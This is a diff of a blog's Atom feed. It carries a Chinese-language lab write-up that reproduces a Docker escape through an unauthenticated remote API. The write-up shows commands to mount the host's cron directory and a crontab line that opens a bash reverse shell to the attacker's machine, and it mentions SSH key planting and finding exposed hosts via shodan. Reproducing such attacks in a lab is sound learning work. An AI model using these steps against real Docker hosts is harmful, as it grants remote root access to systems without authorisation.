@@ -6,7 +6,7 @@
   <link href="https://liuliuliuzy.github.io/atom.xml" rel="self"/>
   
   <link href="https://liuliuliuzy.github.io/"/>
-  <updated>2021-02-05T16:08:08.249Z</updated>
+  <updated>2021-02-08T13:24:40.390Z</updated>
   <id>https://liuliuliuzy.github.io/</id>
   
   <author>
@@ -17,11 +17,11 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>告别2020</title>
-    <link href="https://liuliuliuzy.github.io/2021/02/08/%E5%91%8A%E5%88%AB2020/"/>
-    <id>https://liuliuliuzy.github.io/2021/02/08/%E5%91%8A%E5%88%AB2020/</id>
-    <published>2021-02-08T12:26:10.000Z</published>
-    <updated>2021-02-05T16:08:08.249Z</updated>
+    <title>Docker逃逸系列2:docker.sock危险挂载</title>
+    <link href="https://liuliuliuzy.github.io/2021/02/08/Docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%972-docker-socket%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD/"/>
+    <id>https://liuliuliuzy.github.io/2021/02/08/Docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%972-docker-socket%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD/</id>
+    <published>2021-02-08T11:25:11.000Z</published>
+    <updated>2021-02-08T13:24:40.390Z</updated>
     
     
     
@@ -30,11 +30,11 @@
   </entry>
   
   <entry>
-    <title>Docker remote api逃逸复现</title>
+    <title>Docker逃逸系列2:Docker remote api未授权访问</title>
     <link href="https://liuliuliuzy.github.io/2021/02/07/docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/"/>
     <id>https://liuliuliuzy.github.io/2021/02/07/docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/</id>
     <published>2021-02-07T03:12:15.000Z</published>
-    <updated>2021-02-08T02:32:54.330Z</updated>
+    <updated>2021-02-08T11:25:59.698Z</updated>
     
     <content type="html"><![CDATA[<blockquote><p>docker逃逸第一种方式——remote api未授权访问</p><p>环境：</p><p>宿主机操作系统：Ubuntu 20.04 LTS 192.168.170.129</p><p>执行攻击的主机：Kali，5.9.0-kali1-amd64 192.168.170.128</p><p>docker版本：Docker version 20.10.2, build 2291f61</p></blockquote><h2 id="步骤1、开启docker-remote-api"><a href="#步骤1、开启docker-remote-api" class="headerlink" title="步骤1、开启docker remote api"></a>步骤1、开启docker remote api</h2><p>docker remote api应该是一个提供图形化界面来简化操作的功能，通过将宿主机的docker服务通过socket的方式暴露给外部连接，使得其他主机也可以访问docker服务。</p><h3 id="修改配置，重启服务"><a href="#修改配置，重启服务" class="headerlink" title="修改配置，重启服务"></a>修改配置，重启服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lzy@zyUb:~$ sudo nano /lib/systemd/system/docker.service</span><br><span class="line">[sudo] password <span class="keyword">for</span> lzy: </span><br><span class="line">lzy@zyUb:~$ sudo systemctl daemon-reload</span><br><span class="line">lzy@zyUb:~$ sudo service docker restart</span><br></pre></td></tr></table></figure><p>执行上述命令，在<code>docker.service</code>文件中添加以下红线所标出的内容(<code>-H tcp://0.0.0.0:2375</code>)</p><p><img src="修改文件.png" alt="修改文件"></p><h3 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h3><p>在另一台虚拟机中查看docker宿主机的2375端口，可以看到相关信息。</p><p><img src="remote-api.png" alt="remote-api"></p><p><img src="外部访问.png" alt="外部访问"></p><h2 id="步骤2、漏洞测试"><a href="#步骤2、漏洞测试" class="headerlink" title="步骤2、漏洞测试"></a>步骤2、漏洞测试</h2><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><p>查看docker宿主机上已有的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(lzy㉿kaliForZy)-[~]</span><br><span class="line">└─$ docker -H tcp://192.168.170.129:2375 images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">alpine        latest    e50c909a8df2   9 days ago      5.61MB</span><br><span class="line">ubuntu        18.04     c090eaba6b94   2 weeks ago     63.3MB</span><br><span class="line">hello-world   latest    bf756fb1ae65   13 months ago   13.3kB</span><br></pre></td></tr></table></figure><p>然后创建容器。因为最后反弹shell的实现方式是使用crontab计划任务，所以需要将crontab用到的文件所在路径，也就是宿主机的<code>var/spool/cron</code>目录挂载到容器中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(lzy㉿kaliForZy)-[~]</span><br><span class="line">└─$ docker -H tcp://192.168.170.129:2375 run -it -v /var/spool/cron/:/get3cad/ c090 /bin/bash</span><br></pre></td></tr></table></figure><p>ubuntu的crontab相关文件的路径为<code>var/spool/cron/crontabs/root</code>，但是我自己装的虚拟机在该路径下并不存在<code>root</code>文件。所以在尽进入到容器中后，要切换到相应路径（也可以在创建容器的时候就使用<code>chroot</code>参数），然后创建文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@22b103440b66:/get3cad/crontabs<span class="comment"># touch root</span></span><br></pre></td></tr></table></figure><p>需要注意，创建的<code>root</code>文件默认是644权限，在crontab执行的时候会被认为是不安全模式。所以需要修改权限为<code>600</code>。</p><p><img src="644.png" alt="644"></p><p><img src="secure.png" alt="secure"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@22b103440b66:/get3cad/crontabs<span class="comment"># chmod 600 root</span></span><br></pre></td></tr></table></figure><p>最后往<code>root</code>文件中写入反弹shell的计划任务。同时，因为sh与bash环境的不同，需要将命令用<code>bash -c</code>包含起来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@22b103440b66:/get3cad/crontabs<span class="comment"># echo &#x27;* * * * * bash -c &quot;bash -i  &gt;&amp;/dev/tcp/192.168.170.128/7777 0&gt;&amp;1&quot;&#x27; &gt;&gt; /get3cad/crontabs/root</span></span><br></pre></td></tr></table></figure><p>在攻击者主机中使用nc监听，连接到反弹的shell</p><p><img src="shell.png" alt="shell"></p><p>除反弹shell之外，在宿主机开启了ssh服务的情况下，还可以通过修改配置文件，放入攻击者公钥的情况下，实现<strong>ssh远程登录</strong>，也可以达到和上述crontab计划任务反弹shell相同的效果。</p><h2 id="其他收获"><a href="#其他收获" class="headerlink" title="其他收获"></a>其他收获</h2><ul><li>又发现了几个🐂人的博客</li><li>Linux中执行<code>sudo -i</code>切换到sudo模式，就能够cd到权限不够的路径，这个算是回忆吧</li><li>发现一个很有意思的docker镜像：<a href="https://hub.docker.com/_/busybox">busybox</a>，小而精悍，瑞士军刀</li><li>资源网站：<a href="https://www.shodan.io/">shodan</a>，搜索互联网设备，所以不要轻易将自己的端口暴露在公网。看到这个网站是因为有人没有自己搭环境实现，所以用这个网站搜索现有的开放了远程api的docker环境。从这些博客的尝试结果来看，似乎很多有这一漏洞的docker环境，都被别人植入了挖矿程序。</li></ul><p>前前后后花了4 5个小时，踩坑也是踩了蛮多的。网上的相关博客也有很多，除去内容重复的一些后，我觉得比较有参考价值的都放在下面了。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul><li><a href="https://help.aliyun.com/document_detail/37517.html">Docker remote api漏洞公告</a></li><li><p><a href="https://blog.csdn.net/qq_20453349/article/details/108260472">开启docker的remote api</a></p></li><li><p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">踩坑：解决ubuntu-crontab反弹shell失败的问题</a></p></li><li>他人的实现：<ul><li><a href="https://zgao.top/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">🐂人博客之一</a></li><li><a href="https://www.ouyangxiaoze.com/2020/08/617.html">https://www.ouyangxiaoze.com/2020/08/617.html</a></li></ul></li></ul>]]></content>
     
